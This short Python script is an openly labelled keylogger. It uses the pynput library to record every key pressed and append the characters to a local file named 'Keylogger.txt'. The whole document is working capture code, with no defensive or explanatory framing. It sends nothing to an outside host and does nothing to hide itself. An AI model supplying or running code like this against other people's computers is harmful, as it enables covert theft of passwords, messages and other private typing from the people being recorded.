
#Focus on logging the keys pressed and saving them to a file.
from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("Keylogger.txt","a") as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__=="__main__":
    listener=keyboard.Listener(on_press=keypressed)
    listener.start()
    input()